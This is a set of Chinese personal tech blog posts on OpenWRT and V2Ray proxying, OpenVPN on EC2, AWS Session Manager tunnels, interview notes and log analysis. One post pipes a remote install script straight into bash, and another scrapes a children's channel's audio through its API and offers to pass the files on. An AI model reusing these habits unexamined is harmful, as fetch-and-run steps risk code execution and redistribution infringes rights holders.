通常，我们会把新的节点和已有的所有节点直连，当然，跨境的节点之间例外。而做 WireGuard 点对点配置，加一个对端点，需要改整个的配置，所以，理论上在一个点上改 WireGuard 配置时，上面的所有 WireGuard 链接都会受影响（因为大致需要重启 WireGuard 服务）。
路由选择的复杂性还有一个，就是路由选择的可能的坑，比如节点 A、B 和 C 之间，两两互通，那么从 A 到 C，路由 A-&gt;C 和 A-&gt;B-&gt;C 都是可以的，而且一般情况下自然是直连也就是 A-&gt;C 更好，所以我们这里的方案也是 A-&gt;C。说了“一般情况”，那么肯定就还有“例外”吧，对的，像国内家庭宽带到海外节点之间，就是典型的例外情况，这种情况下直连远不如走国内的厂商中转一下。那么，像我们这样把这种例外情况下就不做直连，路由也直接走中转不就得了？这也不是绝对的，事情是变化的，也许这一时刻这条路由更优，下一时刻又是另外一条路由更优。:- 对啦，我想说的就是，远期有时间的时候，可以考虑下把路由扔给 OSPF 来管理，这样逼格完全就不一是一个层次了！:)
最优雅的内网互通方案其实其实，说到“内网互联的方案”的我最最理想的情况，还是类似于自建 zerotier 的方案。自己搭建PLANT，然后每个节点找台网关机器接入自己的 zerotier 网络，这就完了，所有节点也就互通了。而且路由当能直通的时候，节点之间是直通的，当节点之间不能互通的时候，可以通过 PLANT 来互通。这才是内网互通的最优雅解决方案。下回有空谢谢这个。不过最好还是得哪个贵司给我个机会让我实践一下。:O
]]></content>
      <tags>
        <tag>IPSec</tag>
        <tag>VPC</tag>
        <tag>公有云</tag>
        <tag>checkpoint</tag>
        <tag>VPN</tag>
        <tag>aws</tag>
        <tag>中小企业</tag>
        <tag>方案</tag>
        <tag>transit gateway</tag>
        <tag>WireGuard</tag>
        <tag>OSPF</tag>
        <tag>Zerotier</tag>
        <tag>PLANT</tag>
      </tags>
  </entry>
  <entry>
    <title>为了在家用起来 google nest mini 的旁路由方案</title>
    <url>/2022/07/%E4%B8%BA%E4%BA%86%E5%9C%A8%E5%AE%B6%E7%94%A8%E8%B5%B7%E6%9D%A5%20google%20nest%20mini%20%E7%9A%84%E6%97%81%E8%B7%AF%E7%94%B1%E6%96%B9%E6%A1%88/index.html</url>
    <content><![CDATA[缘起为了把从美国带回来的在家吃灰了几个月的 Google 智能音箱(Google Nest Mini)用起来。而之前由于家里都是终端设备自己搞定科学上网的需求，家里并没有全局的科学上网方案。但这一次由于要用 Google Nest Mini，则必须要搞个设备，搭科学上网环境了。


方案细节设备家里还有个吃灰几年的极路由三（HiWiFi HC5861），用的是联发科的架构（MediaTek MT7620A），这一次打算将其用起来，作为科学上网的设备。
于是将其刷上最新的 OpenWRT。具体过程就不说了。
然后因为我所有的设备，但凡支持，都会起 zerotier，于是这太极三也装上了 zerotier，并加入我的网络（跟我的 vps 以及其他设备在同一个虚拟的 zerotier 网段）
方案变迁socks proxy(V2Ray) 方案因为设备连接 WiFi 时大都会允许设置一个 proxy，所以，在最初的方案里，我是想让这台极三充当一个 socks proxy 的角色，当需要科学上网的设备（这里就是 Google Nest Mini）通过 WiFi 接入家庭网络的时候，将 proxy 指过来，这样实现设备的科学上网。
这个方案也简单，只需要在极三上起一个 V2Ray 服务，这个服务的入站（inbound）只需要开一个整个局域网共享的 socks proxy 的支持就可以了，出站（outbound）当然是对接海外 vps 上的 V2Ray 服务。
最后，这个方案的环境弄好了，结果配 Google Nest Mini 的时候发现无法让其使用 socks proxy，故而最后这个方案没有用起来。
zerotier+透明代理 方案这个方案是想设备（Google Nest Mini）用 WiFi 来连科学上网设备极三，然后在极三上用 iptables 把所有流量转发到海外 vps 的 zerotier 那个网卡所在的 IP 地址的 socks proxy 端口（V2Ray 服务支持）上。
这个方案的问题在于我极三的 WiFi 我用来连家里的 WiFi 了，再要起一个 sid 接受 WiFi 连接呢，配置起来比较麻烦，而且，可能会影响家里原来 WiFi 的信号（因为 WiFi 会互相干扰）。
最后，这个方案虽然也没被放弃，但是极三上的 zerotier 却是配好了。
旁路由+透明代理方案这是最终实施并生效的方案。
大致情况如下：

极路由三上跑 V2Ray 服务
入站启用透明代理和 socks 代理（不是必须的）
路由配置成私有地址和中国国内的网站直连，其他走科学上网。
出站配直连和走海外 vps 上的 V2Ray 服务（我用的是 websocket 方式）


主路由的 DHCP 设置里
绑定极路由三的 mac 地址和一个固定 IP
绑定设备 Google Nest Mini 的 mac 地址和另外一个固定 IP，并强制推送网关地址为极路由三的 IP 地址（上一步配置的）



实施步骤及具体配置极三上安装 V2Ray这其实是个难点。极三上能装软件的空间只有 10M，结果直接 opkg install v2ray-core 出来的可执行文件 v2ray 直接有 20+M，显然不能直接装。幸好有大佬把 v2ray-core port 到了 OpenWRT 上[^1]，他编了个 v2ray-core-mini 勉强可用。具体在极三上：
cd /tmpwget \  https://github.com/kuoruan/openwrt-v2ray/releases/download/v4.45.2-1/v2ray-core-mini_4.45.2-1_mipsel_24kc.ipkopkg install v2ray-core-mini*.ipkrm v2ray-core-mini*.ipk

然后还要一些数据（因为 v2ray-core-mini 包里不含 geoip.dat 和 geosite.dat 等数据文件，这些文件太大了），我们这里手工下载了一个 geosite.dat，这个就够了，那个 geoip.dat 有二十多兆，太大了。
cd /usr/binwget https://github.com/v2fly/domain-list-community/releases/download/20230403032550/dlc.datmv dlc.dat geosite.dat

最好还装上 V2Ray 服务的 luci 包，这样就可以在 web 上直接配置了。注意：有个叫 luci-i18n-v2ray-zh-cn 的中文语言包我没装，主要是为了节省空间，这个也不是必须的。
cd /tmpwget https://github.com/kuoruan/luci-app-v2ray/releases/download/v1.5.6-1/luci-app-v2ray_1.5.6_all.ipkopkg install luci-app-v2ray*.ipkrm luci-app-v2ray*.ipk

极三的（网络）上联配置极三可以用 wan 口去接主路由的 lan 口，但我这里是用的 WiFi 去连的主路由的 WiFi，这种方式使极三上的网。后面的 dhcp 配置里会有所体现。
极三上配置 V2Ray弄清楚逻辑以后配置部分也没啥可讲的。就是：

两个入站（socks 和 dokodemo_door，前者不是必须的，因为我们这个方案里没有用到）
几个出站（最主要的是两个：freedom 和 vmess，这两个一个是直连，还有一个是连海外 VPS 上的 V2Ray）
一些路由，比如私网直连、geosite:cn（中国的网站） 直连。

注意：

路由规则里不能使用 geoip: 开头的写法，因为我们的数据文件里没放 geoip.dat，同理，geosite: 是可以的。
透明代理（dokodemo_door）的设置里，proxy mode 选 default dokodemo

主路由上的配置主路由也是 OpenWRT，主要是修改其 DHCP 配置，
cat &gt;&gt; /etc/config/dhcp &lt;&lt; EOFconfig host  option name &#x27;gee3-5g&#x27;  option mac &#x27;00:00:00:FF:FF:FF&#x27;  option ip &#x27;10.0.0.254&#x27;config host  option name &#x27;google-nest-mini&#x27;  option mac &#x27;00:00:00:FF:FF:FE&#x27;  option ip &#x27;10.0.0.253&#x27;  option tag &#x27;2gw&#x27;config tag &#x27;2gw&#x27;  list dhcp_option &#x27;3,10.0.0.254&#x27;  option force &#x27;1&#x27;EOF/etc/init.d/dnsmasq restart # restart dhcp server

注意：

“00:00:00:FF:FF:FF” 和 “00:00:00:FF:FF:FE” 分别是极三和 Google Nest Mini 的 mac 地址（瞎写的，真实的数据是隐私）
“10.0.0.254” 和 “10.0.0.253” 分别是极三和 Google Nest Mini 的 IP 地址（这也是杜撰的，真实的 IP 是隐私）
主路由的正常推的网关地址应该是 “10.0.0.1”（这里给 Google Nest Mini 推送了旁路由，IP 地址是 10.0.0.254）

附录
Project V

[^1]:V2Ray for OpenWrt
]]></content>
      <tags>
        <tag>Zerotier</tag>
        <tag>Google Nest Mini</tag>
        <tag>智能音箱</tag>
        <tag>旁路由</tag>
        <tag>极路由</tag>
        <tag>透明代理</tag>
        <tag>dokodemo_door</tag>
        <tag>OpenWRT</tag>
        <tag>v2ray-core-mini</tag>
        <tag>v2ray-core</tag>
        <tag>V2Ray</tag>
        <tag>HiWiFi</tag>
        <tag>HC5861</tag>
      </tags>
  </entry>
  <entry>
    <title>从 Client VPN endpoint 迁移到 EC2 上的 OpenVPN</title>
    <url>/2023/02/%E4%BB%8E%20Client%20VPN%20endpoint%20%E8%BF%81%E7%A7%BB%E5%88%B0%20EC2%20%E4%B8%8A%E7%9A%84%20OpenVPN/index.html</url>
    <content><![CDATA[缘起原本有一个 Client VPN endpoint 在 AWS 新加坡。有几个原因导致要迁移：

没几天就不能用了，具体原因不足为外人道也，懂的都懂。
Client VPN endpoint 太贵了。

现有环境
免费的 EC2 一台，跑的是 Amazon Linux 2023



具体步骤安装 OpenVPN由于 Amazon Linux 2023 里没有 OpenVPN 的包，也考察过 Fedora 36 的包，但思来想去，还是源代码编译安装吧，所以 OpenVPN 最后还是源代码编译安装的。
登录 EC2 后，开始操作：
wget https://swupdate.openvpn.org/community/releases/openvpn-2.6.6.tar.gztar xzvf openvpn-2.6.6.tar.gzcd openvpn-2.6.6./configure --prefix=/usr/local/openvpnmake# configure 和 make 的时候会出一些错误# 多半是缺少什么包导致的，见招拆招吧，# 缺什么直接用 sudo dnf install xxx 装上即可sudo make installsudo mkdir /usr/local/openvpn/etcsudo cp ca.crt /usr/local/openvpn/etc/sudo cp server.crt /usr/local/openvpn/etc/sudo cp server.key /usr/local/openvpn/etc/# 因为是迁移，所以这里把原来有的 ca.crt、server.crt 和 # server.key 拷贝到 /usr/local/openvpn/etc/ 目录下cd /usr/local/openvpn/etcsudo wget https://github.com/OpenVPN/openvpn/raw/master/sample/sample-config-files/server.conf# 上面是从 OpenVPN 官方代码库里把服务器配置例子扒下来

配置 OpenVPN 服务器还是在 EC2 上，/usr/local/openvpn/etc 目录下
sudo vim /usr/local/openvpn/etc/server.conf# 以官方例子为模版修改服务器配置文件

有几个地方需要改：

cipher 这一行改成 cipher AES-256-GCM
dh 这一行改成 dh none
user 这一行改成 user nobody
group 这一行改成 group nobody
port 这一行是端口号，自己看着改，缺省 1194 也可以
proto 这一行建议改成 proto tcp
explicit-exit-notify 这一行如果 proto 设成 tcp 的话要改成 explicit-exit-notify 0
cert 这一行改成 cert /usr/local/openvpn/etc/server.crt
key 这一行改成 key /usr/local/openvpn/etc/server.key
ca 这一行改成 ca /usr/local/openvpn/etc/ca.crt
push “route 这一行需要按需写上要推送的路由（每行写一段），比如 push &quot;route 172.16.0.0 255.240.0.0&quot;

Linux 上打开包转发EC2 上
echo &quot;net.ipv4.ip_forward = 1&quot; &gt; /etc/sysctl.d/10-OpenVPN.confsudo sysctl -p /etc/sysctl.d/10-OpenVPN.conf

启动服务EC2 上
sudo /usr/local/openvpn/sbin/openvpn \    --config /usr/local/openvpn/etc/server.conf \    --daemon

AWS 上修改 EC2 的设置所有做包转发的 EC2，都需要强制关掉 AWS 官方的 source&#x2F;destination check。方法是：
Actions-&gt;Networking-&gt;change source/destination check，然后点“stop”
至此，VPN 从 AWS 的 Client VPN endpoint 已经迁移到我们自己的 EC2 上了，以前的客户端，只需要改下 remote 那一行的服务器地址为 EC2 的公网地址，以及将 proto 改成 tcp（Client VPN endpoint 缺省是 udp，而且不能改）即可继续使用，连新的 VPN 服务器。
]]></content>
      <tags>
        <tag>OpenVPN</tag>
        <tag>AWS</tag>
        <tag>AL2023</tag>
        <tag>Amazon Linux 2023</tag>
        <tag>EC2</tag>
        <tag>Client VPN endpoint</tag>
      </tags>
  </entry>
  <entry>
    <title>几个问题</title>
    <url>/2020/12/%E5%87%A0%E4%B8%AA%E9%97%AE%E9%A2%98/index.html</url>
    <content><![CDATA[缘起没啥可说的，面试被问了几个问题，感觉当时答的不太好，事后查了下文档，特此记录下。
Docker 是基于什么我理解是问 Docker 技术的底层原理是什么。
先看看 Docker 官方是怎么说的：
The underlying technology（(Docker 的）底层技术）


里面提到了四个方面：

Namespaces
Control groups
Union file systems
Container format

Namespaces这个其实就是 Linux 本身就支持的东西，Linux 支持 8 种 namespace(来自于 NAMESPACES 的 manual)：



Namespace
Flag
Page
Isolates



Cgroup
CLONE_NEWCGROUP
cgroup_namespaces(7)
Cgroup root directory


IPC
CLONE_NEWIPC
ipc_namespaces(7)
System V IPC, POSIX message queues


Network
CLONE_NEWNET
network_namespaces(7)
Network devices, stacks, ports, etc.


Mount
CLONE_NEWNS
mount_namespaces(7)
Mount points


PID
CLONE_NEWPID
pid_namespaces(7)
Process IDs


Time
CLONE_NEWTIME
time_namespaces(7)
Boot and monotonic clocks


User
CLONE_NEWUSER
user_namespaces(7)
User and group IDs


UTS
CLONE_NEWUTS
uts_namespaces(7)
Hostname and NIS domain name


Docker 用到了其中的 2、3、4、5、8 五种 namespaces
Control groups这其实就是 cgroups，这也是 Linux kernel 就支持的一种技术
Union file systems这也就是 UnionFS，它可以把各个目录的内容挂载到同一个目录下。它的功能很复杂，Docker 的文件系统分层的架构就是由它实现的。
Container format文档上说 Docker 引擎把 namespaces、cgroups 和 UnionFS 组装到一个叫包装器的东西，就是 Container format，Docker 里缺省的叫 libcontainer，现在好像叫 runc 了。
CLOSE_WAIT 状态这个其实稍稍冷静下来画画状态迁移图就能想起来：被动关闭 tcp 连接的一方进入的第一个状态就是 CLOSE_WAIT，在这个状态里会通知应用层：对端过来发数据的通道已关闭，己方有数据要往对端发的赶紧发：），接下来应用发完剩下的数据后，会给对端再发 Fin，同时进入 LASK_ACK 状态，收到对端回的 ACK 后变成 CLOSED 状态。
elasticsearch 集群中的节点类型这个其实不是面试题，只是我想到了，就贴在这里。官方文档在这里：ES 集群里的各种节点

Master-eligible node 这也就是传说中的 Master node，主节点。
Data node 数据节点，没啥好解释的。
Ingest node 翻译叫预处理节点字面上可能不太对，但意思是合适的，就是在数据写入或做 index 之前的预处理，像 pipeline 啥的
Tribe node 这个也简单，译作部落节点完全是字面翻译，其实理解为这是可以连接多个 elasticsearch 集群的节点就对了.
Machine learning node 机器学习节点，这个需要在大开了 xpark.ml.enabled 和 node.ml 之后才会有，我们一般的场景用不到。
Coordinating node 协调节点，老版本中也有叫客户端节点（Client node）的。所有的节点都是协调节点，当然也可以单独配置独立的协调节点。客户端读写 elasticsearch 都是先连的协调节点。协调节点把请求分发到合适的节点，收集返回的数据处理完毕再返回给客户端。官方文档貌似不建议使用单独的协调节点，认为数据节点可以同时做好协调节点的工作。

jvm 堆的 32G 内存问题简言之，当 jvm 堆的内存在 32G 以内时，系统会启用一个内存对象指针压缩技术，将内存对象指针（64 位）压缩；但当大于 32G 时，这个压缩技术不启用，系统必须使用 64 位的指针，导致内存浪费增大，而且大内存对于 GC 时也会更容易导致问题。
]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>面试总结</tag>
        <tag>Cgroups</tag>
        <tag>Namespaces</tag>
        <tag>UnionFS</tag>
        <tag>CLOSE_WAIT</tag>
      </tags>
  </entry>
  <entry>
    <title>从官网扒某儿童频道的一些音频资源</title>
    <url>/2022/05/%E4%BB%8E%E5%AE%98%E7%BD%91%E6%89%92%E6%9F%90%E5%84%BF%E7%AB%A5%E9%A2%91%E9%81%93%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9F%B3%E9%A2%91%E8%B5%84%E6%BA%90/index.html</url>
    <content><![CDATA[缘起乐乐的倾听者的音频资源又需要更新了，于是跟我提了几个需求，让我去“下”（下载）某个著名儿童频道主播播讲的节目（有故事还有其他）。


现状这个主播有官网，但是官网上没有资源，只有 app 和公众号（可能还有在喜马拉雅的）的二维码。
但是发现了其还是有一个移动版的“官网”（域名是 m. 开头的），这个网站跟官网貌似没有同步更新，上面还能直接听节目。
大致看了下页面源代码，很快就扒出了音频资源的下载链接，在命令行用 wget 抓了一下，居然也没有反盗链，实在是良心！
具体脚本先要准备环境（我是在 MacOS，所以用了 Homebrew）
# Command Line Tools (CLT) for Xcodexcode-select --install# Homebrew installation/bin/bash -c \   &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)&quot;# Install curl, jq, wgetbrew install curl jq wget

下面开始抓取并声称下载资源的命令行。
历史课curl &quot;https://m.xxx.xxx/api/media/audiolist.ashx?mid=7268&amp;aid=516&amp;mids=&quot; -o audiolist_qianer_history.jsoncat audiolist_qianer_history.json | jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;# or# curl &quot;https://m.xxx.xxx/api/media/audiolist.ashx?mid=7268&amp;aid=516&amp;mids=&quot; | jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;

世界地理curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=486&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;

成语启蒙curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=250&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;

世界历史curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=477&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;

学诗词curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=8&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=88&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=89&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=90&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=91&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=92&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=93&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=337&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=342&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=341&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=340&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=339&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;

名人传curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=360&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=449&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;

三十六计curl -s &quot;https://m.xxx.xxx/api/media/audiolist.ashx?aid=485&quot; | \    jq -r &#x27;.list[] | &quot;wget -O \&quot;\(.title).mp3\&quot; \(.url)&quot;&#x27;

最后记得把命令输出的命令行代码拷贝出来，再粘贴出来执行一下。资源就会都下载到当前目录下了。
最后需要这些资源又不想自己下载的可以找我。
]]></content>
      <tags>
        <tag>下载</tag>
        <tag>音频</tag>
        <tag>儿童</tag>
        <tag>故事</tag>
        <tag>历史</tag>
        <tag>地理</tag>
        <tag>成语</tag>
        <tag>名人传</tag>
        <tag>诗词</tag>
        <tag>三十六计</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 AWS Session Manager 访问 VPC 内网的资源</title>
    <url>/2023/06/%E5%88%A9%E7%94%A8%20AWS%20Session%20Manager%20%E8%AE%BF%E9%97%AE%20VPC%20%E5%86%85%E7%BD%91%E7%9A%84%E8%B5%84%E6%BA%90/index.html</url>
    <content><![CDATA[缘起因为数据库放 VPC 私网网段里了，然后研发有各种直连数据库的需求，其实也有 VPN 方案，但有的研发认为先拨 VPN 不太方便，而我正好认识到 ssm，觉得挺有意思，所以就有了这篇文章的出炉。
其实实际上，都有了 EC2 了，直接上面建账号，几乎所有的 MySQL 的 GUI 客户端，都支持 ssh tunnel 来连数据库，这样就不需要手工命令自己打洞了，MySQL 的 GUI 客户端就一起给你搞定了，这部分还会再水一篇文章。可是，真的值得吗？后话再说。但 ssm plugin 方案比 ssh tunnel 方案更牛逼的一点是：ssm plugin 方案里，EC2 不需要有公网地址！


本地安装 aws-cli 和 Session Manager plugin# 我的本地环境是 Macbook Air (m1)，# 其他环境可能命令不一样curl \    &quot;https://awscli.amazonaws.com/AWSCLIV2.pkg&quot; \    -o &quot;AWSCLIV2.pkg&quot;sudo installer \    -pkg AWSCLIV2.pkg \    -target /# 以上命令是安装 aws-cli。# 然后当然还需要配置 aws --configure# 或 aws --profile xxx --configurecurl \    &quot;https://s3.amazonaws.com/session-manager-downloads/plugin/latest/mac_arm64/session-manager-plugin.pkg&quot; \    -o &quot;session-manager-plugin.pkg&quot;sudo installer \    -pkg session-manager-plugin.pkg \    -target /sudo ln \    -s /usr/local/sessionmanagerplugin/bin/session-manager-plugin \    /usr/local/bin/session-manager-plugin

如果是Windows环境，可从以下网址下载session-manager-plugin并安装
https://s3.amazonaws.com/session-manager-downloads/plugin/latest/windows/SessionManagerPluginSetup.exe
具体使用场景一：登录服务器aws \    --profile VFans-test \    ssm start-session \    --target i-0xxxxxxxxxxxxxx7

最后成功后显示：

Note: 这种“登录” EC2 服务器跟 ssh 登录 EC2 服务器相比，缺点就是不能上传下载数据。
场景二：打洞到 RDSaws \    --profile VFans-test \    ssm start-session \    --target i-0xxxxxxxxxxxxxxx7 \    --document-name AWS-StartPortForwardingSessionToRemoteHost \    --parameters host=&quot;192.168.xxx.xxx&quot;,portNumber=&quot;3306&quot;,localPortNumber=&quot;5555&quot;

成功后显示：

这时候，再开一个控制台，测试如下：

发现本地的 5555 端口是开着的，如果用 MySQL 客户端来连的话，会发现连上的正好是 MySQL。
]]></content>
      <tags>
        <tag>AWS</tag>
        <tag>EC2</tag>
        <tag>VPC</tag>
        <tag>MySQL</tag>
        <tag>Amazon</tag>
        <tag>ssm</tag>
        <tag>system_manager</tag>
        <tag>session_manager</tag>
        <tag>ssm_plugin</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 sed 和 awk 做简单日志分析</title>
    <url>/2020/06/%E5%88%A9%E7%94%A8%20sed%20%E5%92%8C%20awk%20%E5%81%9A%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/index.html</url>
    <content><![CDATA[环境本实验是在 macOS 下做的，Linux 下可能会稍有不同（比如 gzcat）。
日志文件gzcat data.gz | head -n 40 # data.gz 是日志文件

系统输出：

May 13 00:01:58 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12513]): Could not find uid associated with service: 0: Undefined error: 0 501May 13 00:01:58 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12513]): Service exited with abnormal code: 78May 13 00:02:12 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.xpc.launchd.domain.pid.mdmclient.12523): Failed to bootstrap path: path &#x3D; &#x2F;usr&#x2F;libexec&#x2F;mdmclient, error &#x3D; 108: Invalid pathMay 13 00:04:20 BBAOMACBOOKAIR2 syslogd[113]: ASL Sender StatisticsMay 13 00:05:58 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12535]): Could not find uid associated with service: 0: Undefined error: 0 501May 13 00:05:58 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12535]): Service exited with abnormal code: 78May 13 00:09:58 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12536]): Could not find uid associated with service: 0: Undefined error: 0 501May 13 00:09:58 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12536]): Service exited with abnormal code: 78May 13 00:17:59 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12555]): Could not find uid associated with service: 0: Undefined error: 0 501May 13 00:17:59 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12555]): Service exited with abnormal code: 78May 13 00:17:59 BBAOMACBOOKAIR2 syslogd[113]: ASL Sender StatisticsMay 13 00:19:59 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12556]): Could not find uid associated with service: 0: Undefined error: 0 501May 13 00:19:59 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12556]): Service exited with abnormal code: 78May 13 00:21:59 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12560]): Could not find uid associated with service: 0: Undefined error: 0 501May 13 00:21:59 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12560]): Service exited with abnormal code: 78May 13 00:22:18 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.xpc.launchd.domain.user.914945058): Service “com.apple.xpc.launchd.unmanaged.loginwindow.594” tried to register for endpoint “com.apple.tsm.uiserver” already registered by owner: com.apple.TextInputMenuAgentMay 13 00:22:49 — last message repeated 1 time —May 13 00:23:50 BBAOMACBOOKAIR2 timed[158]: settimeofday({0x5ebacd96,0x52ddf}) &#x3D;&#x3D; 0May 13 00:28:05 BBAOMACBOOKAIR2 syslogd[113]: ASL Sender StatisticsMay 13 00:28:07 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.ScreenSaver.Computer-Name[12564]): Service exited due to SIGKILL | sent by Computer Name[12564]May 13 00:28:17 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing the target of a source after it has been activated; set a breakpoint on _dispatch_bug_deprecated to debugMay 13 00:28:17 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing target queue hierarchy after xpc connection was activated; set a breakpoint on _dispatch_bug_deprecated to debugMay 13 00:28:18 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing the target of a source after it has been activated; set a breakpoint on _dispatch_bug_deprecated to debugMay 13 00:28:18 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing target queue hierarchy after xpc connection was activated; set a breakpoint on _dispatch_bug_deprecated to debugMay 13 00:28:19 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing the target of a source after it has been activated; set a breakpoint on _dispatch_bug_deprecated to debugMay 13 00:28:19 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing target queue hierarchy after xpc connection was activated; set a breakpoint on _dispatch_bug_deprecated to debugMay 13 00:28:20 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing the target of a source after it has been activated; set a breakpoint on _dispatch_bug_deprecated to debugMay 13 00:28:20 BBAOMACBOOKAIR2 VTDecoderXPCService[960]: DEPRECATED USE in libdispatch client: Changing target queue hierarchy after xpc connection was activated; set a breakpoint on _dispatch_bug_deprecated to debugMay 13 00:28:26 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.preference.displays.MirrorDisplays): Service only ran for 9 seconds. Pushing respawn out by 1 seconds.May 13 00:28:31 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.preference.displays.MirrorDisplays): Service only ran for 4 seconds. Pushing respawn out by 6 seconds.May 13 00:29:49 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12610]): Could not find uid associated with service: 0: Undefined error: 0 501May 13 00:29:49 BBAOMACBOOKAIR2 com.apple.xpc.launchd[1] (com.apple.mdworker.bundles[12610]): Service exited with abnormal code: 78May 13 00:30:00 BBAOMACBOOKAIR2 syslogd[113]: Configuration Notice:    ASL Module “com.apple.cdscheduler” claims selected messages.    Those messages may not appear in standard system log files or in the ASL database.May 13 00:30:00 BBAOMACBOOKAIR2 syslogd[113]: Configuration Notice:    ASL Module “com.apple.install” claims selected messages.    Those messages may not appear in standard system log files or in the ASL database.May 13 00:30:00 BBAOMACBOOKAIR2 syslogd[113]: Configuration Notice:    ASL Module “com.apple.callhistory.asl.conf” claims selected messages.



以上日志贴出来可能看的不够清晰，其实就几点：

正常的日志都是日期时间开头，像“May 13 00:30:00”这样
不是这个开头的日志行（基本都是 \t 跳格开头），其实是上一行的继续（日志分析时要将其和上一行合并）
有“— last message repeated 1 time —”的日志其实内容跟上一行是完全一样的（开头的日期时间除外）

要求分析系统日志文件（data.gz）从中得到关键信息，用 Json 的格式 POST 上传至服务器 https://foo.com/bar )，key的名称如下（在括号里）：

设备名称: (deviceName)
错误的进程号码: (processId)
进程&#x2F;服务名称: (processName)
错误的原因（描述）(description)
